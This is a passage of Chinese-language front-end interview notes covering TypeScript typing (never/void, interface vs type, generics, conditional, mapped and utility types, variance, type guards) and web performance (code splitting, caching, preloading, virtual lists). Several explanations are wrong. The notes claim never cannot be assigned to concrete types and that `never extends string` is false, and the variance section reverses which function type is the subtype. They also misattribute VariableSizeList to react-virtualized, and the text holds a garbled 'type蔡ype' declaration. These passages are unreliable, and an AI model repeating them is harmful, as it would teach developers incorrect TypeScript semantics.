// ├────────────┼─────────────────┼────────────────────┤
// │ any        │ 任意类型         │ 任意属性            │
// │ unknown    │ 任意类型         │ 不可（需缩小）       │
// │ never      │ 无（不可赋值）    │ 不可               │
// └────────────┴─────────────────┴────────────────────┘
```

#### 2.2 void vs never

```typescript
// void：函数没有显式返回值（返回undefined）
function log(message: string): void {
  console.log(message);
  // 隐式返回undefined
}

// never：函数永不返回（抛出异常或死循环）
function fail(msg: string): never {
  throw new Error(msg);
}
function infinite(): never {
  while (true) {}
}

// 区别：
// void：返回值类型为 void（返回undefined是合法的）
// never：永不返回（没有返回值概念）

// void可以被忽略返回值，never不能被到达
const r1: void = undefined; // OK
// const r2: never = undefined; // 报错：不能赋值为undefined

// never赋值给其他类型：
type FromNever = never extends string ? true : false; // 永远为false
// never是底部类型，不能赋值给任何具体类型（除了never自身）
// 这个特性用于类型守卫
```

---

### 3. interface vs type

```typescript
// interface：接口
interface User {
  name: string;
  age: number;
}

// type：类型别名
type UserType = {
  name: string;
  age: number;
};

// 两者都能描述对象结构，区别如下：

// ┌─────────────────┬──────────────────┬──────────────────┐
// │ 特性             │ interface         │ type             │
// ├─────────────────┼──────────────────┼──────────────────┤
// │ 对象结构         │ 支持              │ 支持              │
// │ 合并（扩展）     │ 声明合并         │ 不支持            │
// │ 重复声明         │ 可以             │ 不可以（报错）    │
// │ 联合类型         │ 不支持           │ 支持              │
// │ 交叉类型         │ 不支持           │ 支持              │
// │ 计算属性         │ 不支持           │ 支持              │
// │ 映射类型         │ 有限支持         │ 完全支持          │
// │ 元组             │ 不支持           │ 支持              │
// └─────────────────┴──────────────────┴──────────────────┘

// interface 声明合并（最独特的能力）：
interface Config {
  url: string;
}
interface Config {
  timeout: number;
}
// 等价于：
// interface Config { url: string; timeout: number; }

// 应用：扩展第三方库的interface
// 库定义的接口可以自行声明扩展，不需要改库代码

// type联合/交叉：
type A = { a: number } | { b: string };
type B = { c: boolean } & { d: number };

// 实际选型建议：
// 大多数情况用 type（更灵活）
// 需要声明合并时用 interface
// 描述API接口时用 interface（约定俗成）

// 两者都可以被extends扩展：
interface Animal { name: string; }
interface Dog extends Animal { bark(): void; }

type Cat = { name: string } & { meow(): void };
```

---

### 4. 泛型

#### 4.1 什么是泛型

```typescript
// 泛型：类型参数化，让函数/接口/类支持多种类型
// 不使用泛型（不够通用）：
function identity(n: number): number { return n; }
function identityStr(s: string): string { return s; }

// 使用泛型（通用）：
function identity<T>(arg: T): T { return arg; }
const num = identity<number>(1);     // T=number
const str = identity<string>("hi");  // T=string
const inferred = identity(42);      // 自动推断 T=number

// 泛型函数类型：
const fn: <T>(arg: T) => T = identity;
const fn2: { <T>(arg: T): T } = identity;

// 泛型约束（限制T的范围）：
interface HasLength { length: number; }
function logLength<T extends HasLength>(arg: T): number {
  return arg.length;
}
logLength("hello"); // 5
logLength([1, 2]);  // 2
// logLength(123);  // 报错，数字没有length
```

#### 4.2 泛型约束

```typescript
// 多泛型参数：
function pair<K, V>(key: K, value: V): [K, V] {
  return [key, value];
}
const p = pair<string, number>("age", 18); // [string, number]

// 泛型约束：继承某个类型
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}
const user = { name: "张三", age: 18 };
const name = getProperty(user, "name"); // string
// const err = getProperty(user, "height"); // 报错，不在keyof中

// keyof：获取类型的所有键名，返回联合类型
type UserKeys = keyof User; // "name" | "age"

// 泛型默认类型：
function createArray<T = string>(length: number, value: T): T[] {
  return new Array(length).fill(value);
}
const arr = createArray(3); // 默认 T=string，等价于 string[]

// 泛型类：
class Queue<T> {
  private items: T[] = [];
  enqueue(item: T) { this.items.push(item); }
  dequeue(): T | undefined { return this.items.shift(); }
}
const numQueue = new Queue<number>();
numQueue.enqueue(1);
numQueue.enqueue("2"); // 报错，只能是number

// 泛型别名：
type Nullable<T> = T | null | undefined;
type Result<T> = { data: T; error: null } | { data: null; error: Error };

// 多约束：
function process<T extends string & { length: number }>(arg: T): void {}
// T 必须既是string（有length），又有length属性（string满足）
```

---

### 5. 高级类型

#### 5.1 keyof / infer

```typescript
// keyof：获取类型的所有键
interface Person { name: string; age: number; }
type PersonKeys = keyof Person; // "name" | "age"

// infer：条件类型中推断类型
type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
type Fn = (a: number) => string;
type FnReturn = ReturnType<Fn>; // string

// infer 应用：提取函数参数类型
type Parameters<T> = T extends (...args: infer P) => any ? P : never;
type FnParams = Parameters<(a: string, b: number) => void>; // [string, number]

// infer 应用：提取构造器实例类型
type InstanceType<T> = T extends new (...args: any[]) => infer I ? I : never;
class User {}
type UserInstance = InstanceType<typeof User>; // User

// 提取数组元素类型：
type ElementOf<T> = T extends (infer E)[] ? E : never;
type Nums = ElementOf<number[]>; // number

// 提取Promise resolve类型：
type Resolved<T> = T extends Promise<infer V> ? V : T;
type R1 = Resolved<Promise<string>>; // string
type R2 = Resolved<number>;          // number
```

#### 5.2 extends 在 TS 中的作用

```typescript
// extends 在TS中有多种含义：

// 1. 类继承
class Animal { eat() {} }
class Dog extends Animal { bark() {} }

// 2. 接口继承
interface A { a: number; }
interface B extends A { b: string; }
// B有 { a: number; b: string; }

// 3. 泛型约束
function fn<T extends { name: string }>(arg: T) {}

// 4. 条件类型
type IsString<T> = T extends string ? true : false;

// 5. 分配式条件类型（分发）
type ToArray<T> = T extends any ? T[] : never;
type StrNumArr = ToArray<string | number>; // string[] | number[]
// 相当于：(string extends any ? string[] : never) | (number extends any ? number[] : never)
// = string[] | number[]

// 阻止分发：用[]包裹
type ToArrayNonDist<T> = [T] extends [any] ? T[] : never;
type NonDist = ToArrayNonDist<string | number>; // (string | number)[]
// 不再分发，包裹成整体处理
```

#### 5.3 条件类型

```typescript
// 条件类型：T extends U ? X : Y
type IsString<T> = T extends string ? "yes" : "no";
type A = IsString<"hello">; // "yes"
type B = IsString<123>;     // "no"

// 分布式条件类型：
// 如果T是联合类型，条件会分发到每个成员
type Exclude<T, U> = T extends U ? never : T;
type R1 = Exclude<"a" | "b" | "c", "a">; // "b" | "c"
// 原理：(("a" extends "a" ? never : "a") | ("b" extends "a" ? never : "b") | ("c" extends "a" ? never : "c"))
// = never | "b" | "c" = "b" | "c"

type Extract<T, U> = T extends U ? T : never;
type R2 = Extract<"a" | "b" | "c", "a" | "b">; // "a" | "b"

type NonNullable<T> = T extends null | undefined ? never : T;
type R3 = NonNullable<string | null | undefined>; // string

// 嵌套条件类型：
type DeepReadonly<T> = T extends object
  ? { readonly [K in keyof T]: DeepReadonly<T[K]> }
  : T;

// infer实战：
// 从类型中提取信息
type UnpackPromise<T> = T extends Promise<infer U> ? U : T;
type P = UnpackPromise<Promise<string>>; // string

// 组合条件类型实现类型过滤：
type MyPick<T, K> = { [P in K]: T[P] };
```

---

### 6. mapped type（映射类型）

```typescript
// 映射类型：通过泛型从已有类型派生出新类型

// 基础映射：
type Readonly<T> = { readonly [P in keyof T]: T[P] };
type Partial<T> = { [P in keyof T]?: T[P] };
type Required<T> = { [P in keyof T]-?: T[P] }; // -? 移除可选

// keyof + 映射 = 遍历属性
type Mapped = { [K in keyof User]: User[K] }; // 等价于 User（复制）

// as 重映射（TS4.1+）：
type Getters<T> = {
  [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K]
};
type UserGetters = Getters<{ name: string; age: number }>;
// = { getName: () => string; getAge: () => number }

// 过滤属性（never）：
type OmitByType<T, U> = { [K in keyof T as T[K] extends U ? never : K]: T[K] };
type OnlyStrings = OmitByType<{ name: string; age: number; flag: boolean }, string>;
// = { name: string }

// 映射类型的分发：
type Nullable<T> = { [K in keyof T]: T[K] | null };
type UserNullable = Nullable<{ name: string; age: number }>;
// = { name: string | null; age: number | null }

// 元组/数组的映射：
type Greet = { [K in "hello" | "world"]: string };
// = { hello: string; world: string }

// 条件映射：
type蔡ype ConditionalPick<T, U> = {
  [K in keyof T as T[K] extends U ? K : never]: T[K]
};
```

---

### 7. Utility Types 实现原理

```typescript
// TS内置的工具类型，每个都可以手写实现

// 1. Partial<T>：全部属性变为可选
type Partial<T> = { [K in keyof T]?: T[K] };
// 实现：遍历T的每个属性，加?变成可选

// 2. Required<T>：全部属性变为必填
type Required<T> = { [K in keyof T]-?: T[K] };
// 实现：-? 移除可选标记

// 3. Readonly<T>：全部属性变为只读
type Readonly<T> = { readonly [K in keyof T]: T[K] };

// 4. Pick<T, K>：从T中选取属性K
type Pick<T, K extends keyof T> = { [P in K]: T[P] };
type UserName = Pick<{ name: string; age: number }, "name">;
// = { name: string }

// 5. Omit<T, K>：从T中排除属性K
type Omit<T, K> = Pick<T, Exclude<keyof T, K>>;
// 实现：排除keyof T中属于K的，剩下的用Pick取
type UserNoAge = Omit<{ name: string; age: number }, "age">;
// = { name: string }

// 6. Exclude<T, U>：从T中排除可分配给U的类型
type Exclude<T, U> = T extends U ? never : T;
type A = Exclude<"a" | "b" | "c", "a">; // "b" | "c"

// 7. Extract<T, U>：从T中提取可分配给U的类型
type Extract<T, U> = T extends U ? T : never;
type B = Extract<"a" | "b", "a" | "c">; // "a"

// 8. Record<K, V>：构造键类型K到值类型V的对象
type Record<K extends keyof any, V> = { [P in K]: V };
type StrNumMap = Record<string, number>;
// = { [key: string]: number }

// 9. ReturnType<T>：提取函数返回值类型
type ReturnType<T extends (...args: any) => any> =
  T extends (...args: any) => infer R ? R : any;

// 10. Parameters<T>：提取函数参数类型为元组
type Parameters<T extends (...args: any) => any> =
  T extends (...args: infer P) => any ? P : never;

// 11. NonNullable<T>：排除null和undefined
type NonNullable<T> = T extends null | undefined ? never : T;

// 12. InstanceType<T>：获取构造器实例类型
type InstanceType<T extends new (...args: any) => any> =
  T extends new (...args: any) => infer C ? C : any;

// 13. ThisParameterType / OmitThisParameter
type ThisParameterType<T> =
  T extends (this: infer U, ...args: any) => any ? U : never;
type OmitThisParameter<T> =
  T extends (this: infer U, ...args: infer P) => (...args: P) => any
    ? (...args: P) => U
    : T;

// 实战组合：
// 取出函数返回值类型中为Promise的类型
type PromisedReturn<T> = T extends (...args: any[]) => infer R
  ? R extends Promise<infer V> ? V : never
  : never;
```

---

### 8. 协变与逆变（Covariance & Contravariance）

```typescript
// 协变与逆变是函数类型子类型关系的核心

// 简单理解：
// 协变（Covariance）：A是B的子类型，则 T<A> 也是 T<B> 的子类型（返回值）
// 逆变（Contravariance）：A是B的子类型，则 T<B> 是 T<A> 的子类型（参数）

// 示例：
class Animal { move() {} }
class Dog extends Animal { bark() {} }

// 赋值给变量时：
// 参数类型：逆变（接受更宽泛的）
function feedAnimal(fn: (animal: Animal) => void) {}
// 可以传入：
feedAnimal((dog: Dog) => {}); // OK
feedAnimal((animal: Animal) => {}); // OK

// 返回值类型：协变（返回更具体的）
function makeDog(): Dog { return new Dog(); }
function makeAnimal(): Animal { return new Animal(); }
let dogFn: () => Dog = makeDog;       // OK
// let animalFn: () => Animal = makeDog; // OK（协变：Dog是Animal子类型，返回值协变）

// 函数子类型规则：
// (A => B) 是 (C => D) 的子类型
// 当 C 是 A 的子类型（参数逆变）且 D 是 B 的子类型（返回值协变）时成立

// 参数逆变演示：
type FnAnimal = (animal: Animal) => void;
type FnDog = (dog: Dog) => void;
// FnDog 是 FnAnimal 的子类型
// 因为Dog是Animal的子类型（更具体），函数参数要更宽泛（逆变）
const fnDog: FnDog = (d: Dog) => d.bark();
const fnAnimal: FnAnimal = fnDog; // OK
// fnAnimal 调用时可以传入任意Animal（更宽泛），而fnDog只需要Dog

// 为什么会这样？
// 变量fnAnimal的类型要求：接收任何Animal
// fnDog只能处理Dog，但它继承自Animal，所以传入Dog时fnDog能工作
// 如果传给fnDog的是其他Animal子类（非Dog），fnDog可能出错
// 但fnAnimal期望的是Animal（包括Dog），所以fnDog不会收到非Dog的Animal

// 实际场景：
// TS默认函数参数是双向协变的（strictFunctionTypes关闭时）
// 开启strictFunctionTypes后，参数会正确逆变

// TS函数类型签名：
interface TypedPropertyDescriptor<T> {
  get?(): T;
  set?(value: T): void;
}

// 用处：类型推断、泛型约束、深入理解TS行为
```

---

### 9. 类型兼容与类型守卫

```typescript
// 类型兼容：结构化子类型（duck typing）
interface Point { x: number; y: number; }
interface Point2D { x: number; y: number; }
let p: Point = { x: 1, y: 2 };
let p2: Point2D = p; // OK，结构兼容（TS用结构类型而非名义类型）

// 额外属性检查：
function greet(person: { name: string }) {}
// greet({ name: "张三", age: 18 }); // 报错：对象字面量不能有多余属性
// 但先赋值给变量再传入是可以的：
const user = { name: "张三", age: 18 };
greet(user); // OK（user对象在定义时没有多余属性检查）

// 类型守卫（type guard）：缩小类型范围
function isString(value: unknown): value is string {
  return typeof value === 'string';
}
function process(value: unknown) {
  if (isString(value)) {
    console.log(value.toUpperCase()); // TS知道value是string
  }
}

// typeof：基础类型守卫（自动推断）
function padLeft(value: string | number) {
  if (typeof value === 'string') {
    return value.padStart(5); // TS知道是string
  }
  return value.toFixed(2); // TS知道是number
}

// instanceof：类实例守卫
class Animal { move() {} }
class Dog extends Animal { bark() {} }
function act(animal: Animal) {
  if (animal instanceof Dog) {
    animal.bark(); // TS知道是Dog
  }
}

// in操作符：
interface Cat { meow(): void; }
interface Dog { bark(): void; }
function speak(animal: Cat | Dog) {
  if ('bark' in animal) { animal.bark(); } // TS知道是Dog
}

// 可辨识联合（tagged union）：
interface Square { kind: 'square'; size: number; }
interface Circle { kind: 'circle'; radius: number; }
type Shape = Square | Circle;
function area(s: Shape) {
  if (s.kind === 'square') return s.size ** 2;
  if (s.kind === 'circle') return Math.PI * s.radius ** 2;
}

// 类型断言（as）：
const str = "hello" as string;
const num = "123" as unknown as number; // 两层断言
// 类型断言不是转换，编译时被删除
```

---

### 10. 类型断言进阶

#### 10.1 as const / satisfies

```typescript
// as const：将字面量转为readonly元组/字面量类型
const arr = [1, 2, 3] as const;
// 类型：readonly [1, 2, 3]（不是number[]）
const obj = { name: "张三", age: 18 } as const;
// 类型：readonly { readonly name: "张三"; readonly age: 18 }

function route(path: string, mode: "http" | "https") {}
route("api/users", "https" as const); // 不报错

// satisfies：验证类型但不改变推断类型
type Color = "red" | "green" | "blue";
const palette = {
  red: [255, 0, 0],
  green: "#00ff00",
  blue: [0, 0, 255]
} satisfies Record<Color, string | number[]>;

// 对比：
const paletteOld = {
  red: [255, 0, 0],
  green: "#00ff00",
  blue: [0, 0, 255]
} as Record<Color, string | number[]>;
// paletteOld.green.toUpperCase() // 报错，as后推断为string | number[]
// 但palette.green是string字面量，可以toUpperCase()

// satisfies 用途：
// 1. 验证满足约束，同时保留字面量推断
// 2. 适合定义配置对象（约束键值，但保留具体类型）
```

---

### 11. 枚举与声明合并

```typescript
// enum：不推荐使用的原因：
// 1. 编译后产生额外代码（运行时对象）
// 2. 字符串枚举不能反向映射
// 3. 增加打包体积
// 4. 不能tree shaking（enum是单例，always real）

enum Status { Pending, Active, Done }
// 编译后：
// var Status = { 0: "Pending", 1: "Active", 2: "Done", Pending: 0, Active: 1, Done: 2 }
// 运行时对象占用内存，且不可被tree shaking

// const enum：更好的选择（编译时内联）
const enum StatusConst { Pending, Active, Done }
function getStatus(s: StatusConst) {}
getStatus(StatusConst.Pending); // 编译后：getStatus(0 /* Pending */)
// 内联后没有运行时对象，无额外代码
// 但const enum不能通过值访问（StatusConst[0]会报错）

// 推荐：使用联合类型 + const对象
const STATUS = {
  Pending: "pending",
  Active: "active",
  Done: "done"
} as const;
type StatusValue = typeof STATUS[keyof typeof STATUS];
// = "pending" | "active" | "done"
function getStatusConst(s: StatusValue) {}

// 或者使用字面量联合类型：
type Direction = "up" | "down" | "left" | "right";

// 声明合并：同名interface自动合并
interface A { x: number; }
interface A { y: number; }
// 等价于：interface A { x: number; y: number; }

// namespace（已过时）：
// 早期TS用namespace组织代码，现已被ES6 module取代
// 仍然需要了解：declare global / declare module
// 用于扩展全局类型或模块类型
declare global {
  interface Window { myPlugin: any; }
}
// 不需要在模块中export，直接在全局添加

// declaration merging应用：
// 扩展第三方库的接口
interface Window {
  ga: Function;
}
```

---

### 12. 声明文件与 d.ts

```typescript
// .d.ts文件：类型声明文件，供TS编译器读取
// 不包含运行时代码

// 常见场景：
// 1. 为JS库写类型声明（社区@types）
// 2. 为自己的模块提供类型
// 3. 全局声明

// index.d.ts（模块声明）：
// src/index.ts
export function add(a: number, b: number): number { return a + b; }
// 编译后自动生成 dist/index.d.ts

// 手写.d.ts（没有.ts源码时）：
declare module "my-lib" {
  export function greet(name: string): string;
  export const VERSION: string;
}

// 环境声明（无实现）：
declare const $: (selector: string) => HTMLElement;
declare function fetch(url: string): Promise<any>;
declare class Vue {}

// declare关键字：
// declare var, declare function, declare class, declare module
// 告诉TS编译器"这些存在，你不用管实现"

// 常见全局声明：
declare namespace NodeJS {
  interface ProcessEnv { NODE_ENV: "development" | "production"; }
}

// 配合tsconfig：
// "include": ["src", "types/**/*.d.ts"]
// "typeRoots": ["./node_modules/@types", "./types"]
```

---

### 13. TS 提升大型项目体验

```typescript
// TS如何在大型项目中提升体验：

// 1. 智能提示与自动补全
// - IDE能显示类型、属性、方法签名
// - 减少查阅文档时间
// - 重构时自动更新引用

// 2. 编译期错误发现
// - 很多运行时错误提前到编译期
// - null/undefined检查、类型不匹配
// - 减少线上bug

// 3. 代码即文档
// - 类型签名本身就是接口文档
// - 参数/返回值类型清晰可见
// - 新成员快速理解代码

// 4. 重构安全
// - 改函数签名，编译器告诉你哪些调用需要更新
// - rename符号时自动更新所有引用
// - 类型变更全量报错

// 5. API边界清晰
// - 通过interface/type明确契约
// - 团队成员按契约编程
// - 模块解耦

// 实战技巧：
// 1. strict: true 开启所有严格检查
// 2. noImplicitAny: true 不允许隐式any
// 3. strictNullChecks: true 让null/undefined无处遁形
// 4. 使用unknown代替any
// 5. 泛型抽象重复逻辑，减少类型重复
```

---

### 14. Vue / React 结合 TS

```typescript
// React + TS：
// 1. 组件类型
interface Props { name: string; age?: number; }
function UserCard({ name, age = 18 }: Props) { return <div>{name}</div>; }

// 2. FC + children
interface LayoutProps { children: React.ReactNode; }
function Layout({ children }: LayoutProps) { return <div>{children}</div>; }

// 3. 事件处理
function Input() {
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    console.log(e.target.value);
  };
  return <input onChange={handleChange} />;
}

// 4. 状态类型
const [count, setCount] = useState<number>(0);
const [user, setUser] = useState<User | null>(null);

// 5. Ref类型
const inputRef = useRef<HTMLInputElement>(null);
// inputRef.current?.focus();

// 6. 泛型组件
function GenericList<T>({ items, render }: { items: T[]; render: (item: T) => React.ReactNode }) {
  return items.map(render);
}

// 7. useCallback/useMemo类型
const memoizedFn = useCallback<(a: number) => number>((a) => a * 2, []);

// 8. HOC类型
function withAuth<P extends object>(Component: React.ComponentType<P>) {
  return function AuthWrapper(props: P) {
    // 检查权限...
    return <Component {...props} />;
  };
}

// Vue3 + TS：
// 1. defineProps
const props = defineProps<{
  name: string;
  age?: number;
  sexes?: number;
  callback?: (id: number) => void;
}>();
// 或者用withDefaults
const props = withDefaults(defineProps<{
  name: string;
  age?: number;
}>(), { age: 18 });

// 2. defineEmits
const emit = defineEmits<{
  (e: "update", value: number): void;
  (e: "delete", id: string): void;
}>();

// 3. defineExpose
defineExpose({ getData: () => data });

// 4. 组合式函数类型
function useCounter(initial = 0) {
  const count = ref(initial);
  const increment = () => count.value++;
  return [readonly(count), increment] as const;
}

// 5. ref/reactive类型推断
const name = ref<string>("张三"); // 显式指定
const state = reactive<{ count: number }>({ count: 0 });

// 6. 组件类型约束
import type { VNode } from 'vue';
function renderSlot(slots: VNode[]) {}
```

---

### 15. TS 编译性能优化

```typescript
// TS编译慢的原因：
// 1. 类型检查是 O(N^2) 的（需要比较类型关系）
// 2. 大型项目依赖解析时间长
// 3. 每个文件都做类型解析
// 4. 复杂的泛型和条件类型开销大

// 优化方案：

// 1. skipLibCheck: true（最重要）
// 跳过 node_modules/@types/**/*.d.ts 的类型检查
// 可能节省 30-80% 时间

// 2. incremental: true
// 生成 .tsbuildinfo 增量缓存文件
// 第二次编译只检查变更文件

// 3. 减少 include 范围
// 不要 include 整个 src，可以精确到特定目录

// 4. 使用 project references（项目引用）
// 把大仓库拆成小project，每个独立编译
{
  "references": [
    { "path": "./shared" },
    { "path": "./utils" }
  ]
}

// 5. noEmit: true（如果只做类型检查）
// tsconfig for lint（只检查不出包）：
// { "noEmit": true, "skipLibCheck": true }

// 6. 避免过于复杂的泛型
// 条件类型嵌套过深会显著增加检查时间

// 7. ts-build mode（--build）
// tsc --build 是增量模式，比普通模式快
// 只编译outDir改变的模块

// 8. 选择更快的编译器
// esbuild-loader / swc-loader 替代 ts-loader
// 比原生tsc快10-100倍（但功能有限）
// vite使用esbuild做TS编译（开发模式）

// 9. 分离类型检查和编译
// lint阶段只做类型检查（noEmit）
// 打包阶段用swc/esbuild快速编译

// 10. 使用transpileOnly
// ts-loader: { transpileOnly: true }（不检查类型，只转译）
// 类型检查交给fork-ts-checker-webpack-plugin（独立进程）
```

---

## 十一、性能优化终极题库

> 前端性能直接影响用户体验和业务指标。本章覆盖从加载到渲染的全链路优化方案。

---

### 1. 首屏优化方案

```
首屏优化总览：

┌──────────────────────────────────────────────────────────┐
│  首屏（FCP~TTI）                                          │
│                                                          │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐     │
│  │ JS/CSS  │→│ 渲染    │→│ 图片    │→│ 交互    │     │
│  │ 压缩/分割│ │ 关键CSS │ │ 懒加载  │ │ 事件    │     │
│  └─────────┘  └─────────┘  └─────────┘  └─────────┘     │
│                                                          │
│  优化手段：                                               │
│  1. 代码分割（code split）                                │
│  2. 路由懒加载（dynamic import）                          │
│  3. Tree shaking（去除未用代码）                          │
│  4. 压缩（terser/terser for JS，cssnano for CSS）        │
│  5. CDN部署（就近访问）                                   │
│  6. HTTP缓存（Cache-Control/ETag）                       │
│  7. HTTP/2（多路复用，头部压缩）                          │
│  8. 预加载（preload/prefetch）                            │
│  9. 内联关键CSS（inline critical CSS）                    │
└──────────────────────────────────────────────────────────┘
```

#### 1.1 代码分割与懒加载

```javascript
// webpack/vite 配置：
// webpack: 动态import() → 自动code split
// vite: import() → 自动code split

// 路由懒加载（React）：
import React, { Suspense, lazy } from 'react';
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
      </Routes>
    </Suspense>
  );
}

// 组件级懒加载：
const HeavyChart = lazy(() => import('./HeavyChart'));

// webpack手动分割：
// webpack.config.js
new webpack.optimize.SplitChunksPlugin({
  chunks: 'all',
  cacheGroups: {
    vendor: {
      test: /[\\/]node_modules[\\/]/,
      name: 'vendors',
      priority: 10
    },
    common: {
      minChunks: 2,
      name: 'common',
      reuseExistingChunk: true
    }
  }
});

// CSS代码分割：mini-css-extract-plugin
```

#### 1.2 CDN 部署

```javascript
// CDN工作原理：
// 用户请求 → 就近CDN节点（缓存） → 无缓存则回源站
// 优势：减少延迟、提高可用性、减轻源站压力

// 静态资源走CDN：
// 1. JS/CSS/图片/font等静态文件
// 2. npm包（webpack DLL / vite.optimize.deps.include）

// 缓存策略：
// index.html：不缓存或短缓存（no-cache/s-maxage=600）
// 静态资源：长缓存（max-age=31536000） + 内容hash命名
// webpack配置output.filename = '[name].[contenthash].js'

// 动态内容：CDN缓存（Cache-Control: private/no-store）
```

#### 1.3 预加载

```html
<!-- 预加载关键资源：-->
<!-- 预加载当前页面一定需要的资源（立即下载）-->
<link rel="preload" href="main.js" as="script">
<link rel="preload" href="font.woff2" as="font" crossorigin>
<link rel="preload" href="critical.css" as="style">

<!-- 预获取（未来可能需要，闲时下载）-->
<!-- 预获取下一个路由的JS -->
<link rel="prefetch" href="/about.js">
<!-- 预获取下一个页面 -->
<link rel="prerender" href="https://example.com/next-page">

<!-- DNS预解析（减少DNS解析时间）-->
<link rel="dns-prefetch" href="https://cdn.example.com">

<!-- 预连接（建立TCP/TLS连接）-->
<link rel="preconnect" href="https://cdn.example.com" crossorigin>

<!-- 预渲染（同域名下页面整页渲染）-->
<link rel="prerender" href="/landing">

<!-- JS预加载：-->
// 手动预加载
const link = document.createElement('link');
link.rel = 'preload';
link.href = '/big.js';
link.as = 'script';
document.head.appendChild(link);

// 或使用 webpack 的 preload 注释
// import(/* webpackPreload: true */ 'HeavyComponent');

// prefetch：空闲时下载，优先级低（用于下一个路由）
// preload：当前导航需要，优先级高（用于当前页关键资源）
```

#### 1.4 HTTP 缓存策略

```
HTTP 缓存策略图解：

┌────────────────────────────────────────────────────────────┐
│  缓存判断流程：                                              │
│                                                            │
│  1. 浏览器请求 → 检查缓存                                     │
│     ├── 有缓存 → 检查新鲜度（Cache-Control/max-age）          │
│     │            ├── 新鲜 → 直接返回（200 from cache）        │
│     │            └── 陈旧 → 发起条件请求（If-None-Match/     │
│     │                         If-Modified-Since）            │
│     │                         ├── 304 Not Modified（用缓存）  │
│     │                         └── 200 New（更新缓存）        │
│     └── 无缓存 → 请求服务器（200）                           │
└────────────────────────────────────────────────────────────┘

Cache-Control 常见值：
- no-cache：每次验证后使用（可用本地缓存，但需验证）
- no-store：禁止缓存
- private：只允许浏览器缓存（CDN不可缓存）
- public：CDN也可以缓存
- max-age=3600：缓存有效期（秒）
- must-revalidate：过期后必须验证

最佳实践：
1. HTML：Cache-Control: no-cache（确保更新能及时下发）
2. 静态资源（JS/CSS/图片）：max-age=31536000 + 内容hash
   （文件名带hash，改变URL即可更新，浏览器自动重新缓存）
3. CDN：设置s-maxage，CDN节点缓存，浏览器不缓存（private）
```

---

### 2. 白屏时间优化

```javascript
// 白屏原因：
// 1. HTML下载慢
// 2. CSS阻塞渲染（没有内联关键CSS）
// 3. JS阻塞解析（没有defer/async）

// 优化方案1：内联关键CSS
// 把首屏需要的关键CSS直接写在<style>标签内
// <link rel="stylesheet" href="non-critical.css" onload="this.rel='stylesheet'">

// 优化方案2：骨架屏（Skeleton）
// 在内容加载前显示占位图，用户感知更快
// React Skeleton / Vue Skeleton

// 优化方案3：SSR（服务端渲染）
// HTML在服务端生成，首屏HTML包含内容
// 无需等待JS下载执行才知道页面内容

// 优化方案4：预渲染/静态生成（SSG）
// 预构建HTML，服务端直接返回
// Next.js / Nuxt.js 支持

// 优化方案5：减少阻塞渲染的资源
// <script async> 异步加载，不阻塞解析
// <script defer> 解析完HTML后执行，不阻塞解析
// CSS<link rel="preload"> + link.onload 延迟加载

// 优化方案6：HTTP/2 + 服务器推送
// 服务器主动推送关键资源（不再依赖HTML中声明）
```

---

### 3. 长列表优化

```javascript
// 长列表问题：DOM节点过多，渲染卡顿
// 解决：只渲染可视区域 + 滚动时动态加载

// 方案1：虚拟列表（只渲染可见行）
// 核心：滚动时计算可见范围，只渲染该范围内的行
// 配合固定行高或动态高度

// 方案2：懒加载 + 分页
// 无限滚动：IntersectionObserver检测到底部，加载更多

// 方案3：时间分片（每次渲染一小批）
function renderBatch(items, batchSize = 100) {
  let index = 0;
  function render() {
    const batch = items.slice(index, index + batchSize);
    // 渲染这批
    appendToDOM(batch);
    index += batchSize;
    if (index < items.length) {
      requestAnimationFrame(render); // 下帧继续
    }
  }
  requestAnimationFrame(render);
}

// 方案4：Canvas/WebGL（渲染百万级数据）
// 自己管理绘制，不依赖DOM

// 方案5：懒加载图片（只加载可见区域）
// IntersectionObserver监测可见图片，按需加载
```

---

### 4. 虚拟列表原理

```javascript
// 虚拟列表：只渲染可视区域的行，高性能渲染万级数据

class VirtualList {
  constructor({ container, itemCount, itemHeight, renderItem }) {
    this.container = container;
    this.itemCount = itemCount;
    this.itemHeight = itemHeight;
    this.renderItem = renderItem;

    this.scrollTop = 0;
    this.containerHeight = container.clientHeight;

    // 创建滚动容器
    this.scrollEl = document.createElement('div');
    this.scrollEl.style.height = `${itemCount * itemHeight}px`;
    container.appendChild(this.scrollEl);

    // 创建列表容器
    this.listEl = document.createElement('div');
    this.listEl.style.position = 'relative';
    container.appendChild(this.listEl);

    container.addEventListener('scroll', () => this.onScroll());
    this.render();
  }

  onScroll() {
    this.scrollTop = this.container.scrollTop;
    this.render();
  }

  render() {
    // 计算可见范围
    const startIndex = Math.floor(this.scrollTop / this.itemHeight);
    const endIndex = Math.ceil(
      (this.scrollTop + this.containerHeight) / this.itemHeight
    );

    // 缓冲区域（上下多渲染几行）
    const buffer = 3;
    const start = Math.max(0, startIndex - buffer);
    const end = Math.min(this.itemCount - 1, endIndex + buffer);

    // 清空并重新渲染
    this.listEl.innerHTML = '';

    for (let i = start; i <= end; i++) {
      const el = this.renderItem(i);
      el.style.position = 'absolute';
      el.style.top = `${i * this.itemHeight}px`;
      el.style.width = '100%';
      this.listEl.appendChild(el);
    }
  }
}

// 动态高度虚拟列表（复杂）：
// 1. 先预估行高（cache-first-estimated-size）
// 2. 滚动时测量实际行高
// 3. 维护每个元素的位置信息（offset tree）
// 库：react-virtualized / vue-virtual-scroller / @tanstack/virtual

// react-virtualized 示例：
import { VariableSizeList } from 'react-virtualized';
function VirtualizedList({ items }) {
  return (
    <VariableSizeList
      height={500}
      itemCount={items.length}
      itemSize={index => getItemHeight(items[index])}
      width="100%"
    >
      {({ index, style }) => (
        <div style={style}>{items[index].name}</div>
      )}
    </VariableSizeList>
  );
}
```

---

### 5. 图片优化

```javascript
// 图片优化矩阵：
// ┌────────────────┬────────────┬────────────────────────┐
// │ 格式            │ 压缩效果   │ 场景                   │
// ├────────────────┼────────────┼────────────────────────┤
// │ WebP           │ 30%更小    │ 通用，兼容性已很好       │
// │ AVIF           │ 比WebP小30% │ 现代浏览器，内容图片    │
// │ SVG            │ 矢量无损   │ 图标/插图               │
